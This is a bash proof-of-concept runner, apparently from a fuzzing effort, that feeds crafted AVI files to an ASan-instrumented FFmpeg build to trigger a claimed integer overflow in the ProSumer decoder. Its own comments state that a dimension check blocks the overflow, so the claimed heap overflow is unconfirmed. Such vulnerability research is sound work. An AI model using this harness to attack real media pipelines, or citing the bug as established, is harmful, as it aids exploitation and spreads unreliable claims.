#!/bin/bash
# PoC runner for integer overflow in ProSumer decode_init (FFmpeg)
# Vulnerability: libavcodec/prosumer.c lines 339-345
# FourCC: BT20 (AV_CODEC_ID_PROSUMER)
#
# s->size = avctx->height * s->stride overflows uint32
# -> av_malloc allocates only ~128KB
# -> vertical_predict writes 4.3GB -> heap-buffer-overflow
#
# KNOWN ISSUE: av_image_check_size2 in ff_set_dimensions (avcodec.c:233-238)
# rejects overflow-triggering dimensions before decode_init() can run.
# For height*stride > 2^32, the check (8w)*(h+128) >= INT_MAX always fires.
# This is mathematically proven to be a blocking constraint.
#
# NOTE: -discard_damaged_percentage must be placed BEFORE -i to apply to
# the input decoder, not the output encoder.

set -uo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating crafted AVI files..."
python3 vuln_001_gen.py

echo ""
echo "=== ATTEMPT 1: Report dimensions (65536x43692) ==="
# -discard_damaged_percentage 100 before -i => applies to decoder
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_1.log" \
  "$BIN" \
    -discard_damaged_percentage 100 \
    -i vuln_001_input.avi \
    -f null - 2>&1 || true
for f in asan_1.log.*; do
    [ -f "$f" ] && { echo "--- ASAN LOG: $f ---"; cat "$f"; }
done 2>/dev/null || true

echo ""
echo "=== ATTEMPT 2: Force prosumer codec explicitly ==="
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_2.log" \
  "$BIN" \
    -codec:v prosumer \
    -discard_damaged_percentage 100 \
    -i vuln_001_input.avi \
    -f null - 2>&1 || true
for f in asan_2.log.*; do
    [ -f "$f" ] && { echo "--- ASAN LOG: $f ---"; cat "$f"; }
done 2>/dev/null || true

echo ""
echo "=== ATTEMPT 3: Relaxed pixel limit + strict=-2 ==="
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_3.log" \
  "$BIN" \
    -discard_damaged_percentage 100 \
    -strict -2 \
    -i vuln_001_input.avi \
    -f null - 2>&1 || true
for f in asan_3.log.*; do
    [ -f "$f" ] && { echo "--- ASAN LOG: $f ---"; cat "$f"; }
done 2>/dev/null || true

echo ""
echo "[*] Done."
